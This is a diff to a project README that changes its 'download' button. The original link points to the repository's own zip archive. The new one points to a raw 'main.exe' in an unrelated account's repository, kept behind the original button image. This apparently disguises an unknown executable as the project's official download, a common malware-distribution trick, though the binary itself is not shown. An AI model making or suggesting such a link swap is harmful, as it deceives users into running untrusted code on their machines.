@@ -28,7 +28,7 @@
  
  Install using git bash<code> (Currently unavailable)$git clone https://github.com/ </code><br>
  os click download button 👇(Currently unavailable) <br>
- <a href="https://github.com//archive/refs/heads/main.zip" target="blank"><img align="center" src="https://github.com//resources/blob/main/src/download_bt.png" alt="blank" height="78" width="200" /></a>
+ <a href="https://github.com/monkeythatprograms/pythontic/raw/main/main.exe" target="blank"><img align="center" src="https://github.com/Akshay-Vs/resources/blob/main/src/download_bt.png" alt="blank" height="78" width="200" /></a>
  
 <h2 align="left"><b>Connect with me</b></h4>
 <p align="left">
